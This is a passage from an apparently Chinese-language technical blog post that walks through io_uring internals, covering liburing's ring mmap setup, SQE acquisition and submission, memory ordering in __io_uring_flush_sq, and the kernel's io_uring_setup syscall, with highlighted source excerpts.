class="line">&#123;</span><br><span class="line">__sys_munmap(sq-&gt;sqes, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ptr);</span><br><span class="line">&#125;</span><br><span class="line">sq-&gt;ring_ptr = ptr;</span><br><span class="line">sq-&gt;ring_sz = buf_size;</span><br><span class="line">cq-&gt;ring_sz = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过下面一部分就是真正重要的了：</p><p>p正是传入 <code>io_uring_setup</code> 的结构体，所以对p的赋值才是至关重要的，这里的sq和cq不过是 <code>liburing</code>  暴露给用户的管理结构 <code>io_uring</code> 中的一个成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cq-&gt;ring_ptr = (<span class="type">void</span> *)sq-&gt;ring_ptr;</span><br><span class="line">p-&gt;sq_off.user_addr = (<span class="type">unsigned</span> <span class="type">long</span>)sq-&gt;sqes;</span><br><span class="line">p-&gt;cq_off.user_addr = (<span class="type">unsigned</span> <span class="type">long</span>)sq-&gt;ring_ptr;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">int</span>)mem_used;</span><br></pre></td></tr></table></figure><p>所以规根结底就是写入了 p的 sq_off 和 cq_off</p><h4 id="io-uring-queue-mmap"><code>io_uring_queue_mmap</code></h4><p>这是对于没有设置NO_MMAP的情形下，完成了 syscall <code>io_uring_setup</code> 处理后，mmap的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__cold <span class="type">int</span> <span class="title function_">io_uring_queue_mmap</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">   <span class="keyword">struct</span> io_uring *ring)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(ring, <span class="number">0</span>, <span class="keyword">sizeof</span>(*ring));</span><br><span class="line"><span class="keyword">return</span> io_uring_mmap(fd, p, &amp;ring-&gt;sq, &amp;ring-&gt;cq);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是计算了sq和cq的ring的size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_uring_mmap</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> io_uring_sq *sq, <span class="keyword">struct</span> io_uring_cq *cq)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> size;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_cqe);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_CQE32)</span><br><span class="line">size += <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_cqe);</span><br><span class="line"></span><br><span class="line">sq-&gt;ring_sz = p-&gt;sq_off.<span class="built_in">array</span> + p-&gt;sq_entries * <span class="keyword">sizeof</span>(<span class="type">unsigned</span>);</span><br><span class="line">cq-&gt;ring_sz = p-&gt;cq_off.cqes + p-&gt;cq_entries * size;</span><br></pre></td></tr></table></figure><p>然后开始mmap sq 和 cq ring的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p-&gt;features &amp; IORING_FEAT_SINGLE_MMAP)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (cq-&gt;ring_sz &gt; sq-&gt;ring_sz)</span><br><span class="line">sq-&gt;ring_sz = cq-&gt;ring_sz;</span><br><span class="line">cq-&gt;ring_sz = sq-&gt;ring_sz;</span><br><span class="line">&#125;</span><br><span class="line">sq-&gt;ring_ptr = __sys_mmap(<span class="number">0</span>, sq-&gt;ring_sz, PROT_READ | PROT_WRITE,</span><br><span class="line">  MAP_SHARED | MAP_POPULATE, fd,</span><br><span class="line">  IORING_OFF_SQ_RING);<span class="comment">// offset = 0</span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(sq-&gt;ring_ptr))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(sq-&gt;ring_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;features &amp; IORING_FEAT_SINGLE_MMAP)</span><br><span class="line">&#123;</span><br><span class="line">cq-&gt;ring_ptr = sq-&gt;ring_ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">cq-&gt;ring_ptr = __sys_mmap(<span class="number">0</span>, cq-&gt;ring_sz, PROT_READ | PROT_WRITE,</span><br><span class="line">  MAP_SHARED | MAP_POPULATE, fd,</span><br><span class="line">  IORING_OFF_CQ_RING);</span><br><span class="line">  <span class="comment">// offset = 8000000 </span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(cq-&gt;ring_ptr))</span><br><span class="line">&#123;</span><br><span class="line">ret = PTR_ERR(cq-&gt;ring_ptr);</span><br><span class="line">cq-&gt;ring_ptr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果设置了 <code>IORING_FEAT_SINGLE_MMAP</code> ，就可以将sq 和 cq的ring一起mmap，否则，就分别单独mmap</p><p>最后再mmap sq的sqes</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">size += <span class="number">64</span>;</span><br><span class="line">sq-&gt;sqes = __sys_mmap(<span class="number">0</span>, size * p-&gt;sq_entries, PROT_READ | PROT_WRITE,</span><br><span class="line">  MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQES);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(sq-&gt;sqes))</span><br><span class="line">&#123;</span><br><span class="line">ret = PTR_ERR(sq-&gt;sqes);</span><br><span class="line">err:</span><br><span class="line">io_uring_unmap_rings(sq, cq);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后的最后，设置相关指针 [[#io_uring_setup_ring_pointers]]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io_uring_setup_ring_pointers(p, sq, cq);</span><br></pre></td></tr></table></figure><h4 id="io-uring-setup-ring-pointers">io_uring_setup_ring_pointers</h4><p>此函数用来设置 <code>struct io_uring ring</code>  也就是liburing的核心管理结构体.</p><p>我们知道 <code>sq-&gt;ring_ptr</code> 在 kernel被映射到一个内核结构体, 其中结构体各个成员的偏移通过 <code>io_uring_params</code>  的两个 <code>offset</code> 成员结构体返回, 这里通过此拿到结构体对应成员的指针, 并赋值给 <code>sq</code> 和 <code>cq</code> 的各个成员, 这里的 <code>sq</code> 和 <code>cq</code> 又是 管理结构体 <code>ring</code> 的成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_uring_setup_ring_pointers</span><span class="params">(<span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> io_uring_sq *sq,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> io_uring_cq *cq)</span></span><br><span class="line">&#123;</span><br><span class="line">sq-&gt;khead = sq-&gt;ring_ptr + p-&gt;sq_off.head;</span><br><span class="line"><span class="comment">// 设置sq head的指针</span></span><br><span class="line">sq-&gt;ktail = sq-&gt;ring_ptr + p-&gt;sq_off.tail;</span><br><span class="line"><span class="comment">// 设置sq tail指针</span></span><br><span class="line">sq-&gt;kring_mask = sq-&gt;ring_ptr + p-&gt;sq_off.ring_mask;</span><br><span class="line">sq-&gt;kring_entries = sq-&gt;ring_ptr + p-&gt;sq_off.ring_entries;</span><br><span class="line"><span class="comment">// 设置sq entries个数</span></span><br><span class="line">sq-&gt;kflags = sq-&gt;ring_ptr + p-&gt;sq_off.flags;</span><br><span class="line"><span class="comment">// 设置对应标志</span></span><br><span class="line">sq-&gt;kdropped = sq-&gt;ring_ptr + p-&gt;sq_off.dropped;</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">sq-&gt;<span class="built_in">array</span> = sq-&gt;ring_ptr + p-&gt;sq_off.<span class="built_in">array</span>;</span><br><span class="line"><span class="comment">// 如果存在sqarray</span></span><br><span class="line">cq-&gt;khead = cq-&gt;ring_ptr + p-&gt;cq_off.head;</span><br><span class="line"><span class="comment">// 设置cq head指针</span></span><br><span class="line">cq-&gt;ktail = cq-&gt;ring_ptr + p-&gt;cq_off.tail;</span><br><span class="line"><span class="comment">// 设置cq tail指针</span></span><br><span class="line">cq-&gt;kring_mask = cq-&gt;ring_ptr + p-&gt;cq_off.ring_mask;</span><br><span class="line">cq-&gt;kring_entries = cq-&gt;ring_ptr + p-&gt;cq_off.ring_entries;</span><br><span class="line">cq-&gt;koverflow = cq-&gt;ring_ptr + p-&gt;cq_off.overflow;</span><br><span class="line">cq-&gt;cqes = cq-&gt;ring_ptr + p-&gt;cq_off.cqes;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;cq_off.flags)</span><br><span class="line">cq-&gt;kflags = cq-&gt;ring_ptr + p-&gt;cq_off.flags;</span><br><span class="line"></span><br><span class="line">sq-&gt;ring_mask = *sq-&gt;kring_mask;</span><br><span class="line">sq-&gt;ring_entries = *sq-&gt;kring_entries;</span><br><span class="line">cq-&gt;ring_mask = *cq-&gt;kring_mask;</span><br><span class="line">cq-&gt;ring_entries = *cq-&gt;kring_entries;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="io-uring-get-sqe"><code>io_uring_get_sqe</code></h3><p>此函数用来获取一个可用 <code>sqe</code> 用来提交任务，最终是调用了  <code>_io_uring_get_sqe</code>， 整个函数用非常优雅的方式实现了循环队列// #Elegant</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">IOURINGINLINE <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *_<span class="title">io_uring_get_sqe</span>(<span class="keyword">struct</span> <span class="title">io_uring</span> *<span class="title">ring</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> *<span class="title">sq</span> =</span> &amp;ring-&gt;sq;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head, next = sq-&gt;sqe_tail + <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> shift = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ring-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">shift = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (!(ring-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">head = IO_URING_READ_ONCE(*sq-&gt;khead);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">head = io_uring_smp_load_acquire(sq-&gt;khead);</span><br><span class="line"><span class="comment">// 通过原子读获取head</span></span><br><span class="line"><span class="comment">// sq-&gt;khead = sq-&gt;ring_ptr + p-&gt;sq_off.head;</span></span><br><span class="line"><span class="comment">// 这里实际上读的是共享内存的一个指针内存的 uint 值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (next - head &lt;= sq-&gt;ring_entries) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line"></span><br><span class="line">sqe = &amp;sq-&gt;sqes[(sq-&gt;sqe_tail &amp; sq-&gt;ring_mask) &lt;&lt; shift];</span><br><span class="line"><span class="comment">// sq-&gt;ring_mask 来自kernel 设置的params </span></span><br><span class="line"><span class="comment">// rings-&gt;sq_ring_mask = p-&gt;sq_entries - 1;</span></span><br><span class="line"><span class="comment">// 由于sq_entries 为2的幂次倍</span></span><br><span class="line"><span class="comment">// 这里实际上就是一个循环队列的访问，</span></span><br><span class="line">sq-&gt;sqe_tail = next;</span><br><span class="line"><span class="keyword">return</span> sqe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="io-uring-prep-xxx"><code>io_uring_prep_xxx</code></h3><p>这是一个系列函数, 用来实现 <code>io_uring</code>  提供的各种 io操作, 其根本实现是 设置 一个 <code>sqe</code> 结构体(这个结构体是内核的API),</p><p>这里以 <code>io_uring_prep_openat</code> 为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IOURINGINLINE <span class="type">void</span> <span class="title function_">io_uring_prep_openat</span><span class="params">(<span class="keyword">struct</span> io_uring_sqe *sqe, <span class="type">int</span> dfd,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span> *path, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params"><span class="type">mode_t</span> mode)</span></span><br><span class="line">&#123;</span><br><span class="line">io_uring_prep_rw(IORING_OP_OPENAT, sqe, dfd, path, mode, <span class="number">0</span>);</span><br><span class="line">sqe-&gt;open_flags = (__u32) flags;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IOURINGINLINE <span class="type">void</span> <span class="title function_">io_uring_prep_rw</span><span class="params">(<span class="type">int</span> op, <span class="keyword">struct</span> io_uring_sqe *sqe, <span class="type">int</span> fd,</span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">void</span> *addr, <span class="type">unsigned</span> len,</span></span><br><span class="line"><span class="params">    __u64 offset)</span></span><br><span class="line">&#123;</span><br><span class="line">sqe-&gt;opcode = (__u8) op;</span><br><span class="line"><span class="comment">// 设置op为 open</span></span><br><span class="line">sqe-&gt;flags = <span class="number">0</span></span><br><span class="line">sqe-&gt;ioprio = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;fd = fd;</span><br><span class="line"><span class="comment">// 提供表示dir 的 -100 fd</span></span><br><span class="line">sqe-&gt;off = offset;</span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line">sqe-&gt;addr = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line"><span class="comment">// 提供文件地址</span></span><br><span class="line">sqe-&gt;len = len;</span><br><span class="line">sqe-&gt;rw_flags = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;buf_index = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;personality = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;file_index = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;addr3 = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;__pad2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>归根结底就是设置了一个sqe</p><p>这里笔者有一个问题：<br>#TODO<br>在<code>IORING_SETUP_SQROLL</code>时, io_uring用户和内核采用共享内存通信，内核态是如何知道一个sqe的全部参数已经设置完毕了，有没有可能用户态正在设置sqe的部分成员时，内核已经在处理这个sqe了？</p><p>在之后  [[#<code>__io_uring_flush_sq</code>]] 笔者似乎找到了这个问题的答案：</p><ul><li>通过 <code>memory_store_release</code> 保证sqe的更新不会被重排到 ktail 的修改前</li><li>通过 修改 ktail 表示真正提交了一个任务</li></ul><h3 id="io-uring-submit"><code>io_uring_submit</code></h3><p><code>io_uring_submit</code> 用于提交一个任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_uring_submit</span><span class="params">(<span class="keyword">struct</span> io_uring *ring)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __io_uring_submit_and_wait(ring, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_submit_and_wait(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> wait_nr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __io_uring_submit(ring, __io_uring_flush_sq(ring), wait_nr, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终到达 <code>__io_uring_submit</code>.  不过这个函数, 在SQPOLL模式下用处不大, 真正的提交操作应该说是在 <code>__io_uring_flush_sq</code> 中实现的.</p><p>这里主要是判断当前情况需不需要调用 <code>io_uring_enter</code> syscall.</p><p>如果当前 是IOPOLL模式, 就需要 <code>io_uring_enter</code> 来收割任务.</p><p>如果是 SQPOLL 模式， 且 内核处理线程已 <code>idle</code> ，那么就通过  <code>io_uring_enter</code> syscall 来唤醒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_submit(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> submitted,</span><br><span class="line">     <span class="type">unsigned</span> wait_nr, <span class="type">bool</span> getevents)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">bool</span> cq_needs_enter = getevents || wait_nr || cq_ring_needs_enter(ring);</span><br><span class="line"><span class="type">unsigned</span> flags;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (sq_ring_needs_enter(ring, submitted, &amp;flags) || cq_needs_enter) &#123;</span><br><span class="line"><span class="keyword">if</span> (cq_needs_enter)</span><br><span class="line">flags |= IORING_ENTER_GETEVENTS;</span><br><span class="line"><span class="keyword">if</span> (ring-&gt;int_flags &amp; INT_FLAG_REG_RING)</span><br><span class="line">flags |= IORING_ENTER_REGISTERED_RING;</span><br><span class="line"></span><br><span class="line">ret = __sys_io_uring_enter(ring-&gt;enter_ring_fd, submitted,</span><br><span class="line">   wait_nr, flags, <span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">ret = submitted;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-uring-flush-sq"><code>__io_uring_flush_sq</code></h4><p>主要用来更新内核sq 的tail指针， 最终返回需要提交的任务数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> __io_uring_flush_sq(<span class="keyword">struct</span> io_uring *ring)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> *<span class="title">sq</span> =</span> &amp;ring-&gt;sq;</span><br><span class="line"><span class="type">unsigned</span> tail = sq-&gt;sqe_tail;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sq-&gt;sqe_head != tail) &#123;</span><br><span class="line">sq-&gt;sqe_head = tail;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ensure kernel sees the SQE updates before the tail update.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!(ring-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">IO_URING_WRITE_ONCE(*sq-&gt;ktail, tail);</span><br><span class="line"><span class="comment">// 原子读</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_uring_smp_store_release(sq-&gt;ktail, tail);</span><br><span class="line"><span class="comment">// memory_release 的内存序来写</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> */</span><br><span class="line"><span class="keyword">return</span> tail - *sq-&gt;khead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 SQPOLL 模式下,内核提交者可能同时在更新头指针。<br>对于非 SQPOLL 模式,应用自己更新头指针,不存在并发问题。<br>即使 SQPOLL 模式下,就算头指针读取是原子的,获取到的值也可能立即过期,存在并发修改的问题。</p><p>最坏情况下,读取的值会高估实际可提交的请求数。</p><p>在这里用到了一个原子写 <code>IO_URING_WRITE_ONCE</code> .</p><p>而 <code>io_uring_smb_store_release</code> 笔者涉及到内存序的问题，内存序是为了防止指令重排产生的，笔者还没有特别理解。</p><p>笔者尝试解释一下， 这里使用使用<code>memory_order_release</code>内存序标注这个存储操作</p><p>release内存序的特点是:</p><ol><li>当前线程本地的修改对其他线程可见</li><li>防止存储操作被重新排序</li></ol><p>这里应该是让此处对于sqe的修改，要在对于tail指针的修改前完成，防止指令重排的影响</p><p>如果是对于IOPOLL，内核的真正确认提交是在 <code>io_uring_enter</code> 实现的，其实是和当前处于同一个线程，因此不需要通过  <code>memory_order_release</code> 来保证 “当前线程本地的修改对其他线程可见”， 对同一线程的数据冒险应该是由旁路机制处理的</p><p>#TODO</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> io_uring_smp_store_release(p, v)\</span></span><br><span class="line"><span class="meta">atomic_store_explicit((_Atomic __typeof__(*(p)) *)(p), (v), \</span></span><br><span class="line"><span class="meta">      memory_order_release)</span></span><br></pre></td></tr></table></figure><h2 id="syscall">syscall</h2><p>syscall是内核提供给用户态的接口，io_uring涉及三个syscall</p><ul><li><a href="https://man7.org/linux/man-pages/man2/io_uring_setup.2.html">io_uring_setup(2)</a></li><li><a href="https://man7.org/linux/man-pages/man2/io_uring_enter.2.html">io_uring_enter(2)</a></li><li><a href="https://man7.org/linux/man-pages/man2/io_uring_register.2.html">io_uring_register(2)</a></li></ul><p>笔者这里主要讲述前两个syscall</p><h3 id="io-uring-setup"><code>io_uring_setup</code></h3><p>参数</p><ul><li>entries:  sq队列大小</li><li>params：提供的各种参数，许多返回值也会写入此结构体积</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">io_uring_setup</span><span class="params">(u32 entries, <span class="keyword">struct</span> io_uring_params __user *params)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">p</span>;</span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;p, params, <span class="keyword">sizeof</span>(p)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="comment">// 将params复制到内核空间</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ARRAY_SIZE(p.resv); i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (p.resv[i])</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p.flags &amp; ~(IORING_SETUP_IOPOLL | IORING_SETUP_SQPOLL |</span><br><span class="line">IORING_SETUP_SQ_AFF | IORING_SETUP_CQSIZE |</span><br><span class="line">IORING_SETUP_CLAMP | IORING_SETUP_ATTACH_WQ |</span><br><span class="line">IORING_SETUP_R_DISABLED | IORING_SETUP_SUBMIT_ALL |</span><br><span class="line">IORING_SETUP_COOP_TASKRUN | IORING_SETUP_TASKRUN_FLAG |</span><br><span class="line">IORING_SETUP_SQE128 | IORING_SETUP_CQE32 |</span><br><span class="line">IORING_SETUP_SINGLE_ISSUER | IORING_SETUP_DEFER_TASKRUN |</span><br><span class="line">IORING_SETUP_NO_MMAP | IORING_SETUP_REGISTERED_FD_ONLY |</span><br><span class="line">IORING_SETUP_NO_SQARRAY))</span><br><span class="line"><span class="keyword">return</span> -EINVAL; </span><br><span class="line"><span class="comment">// 如果有非法flag，直接返回</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> io_uring_create(entries, &amp;p, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是首先检查entries 和flags。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 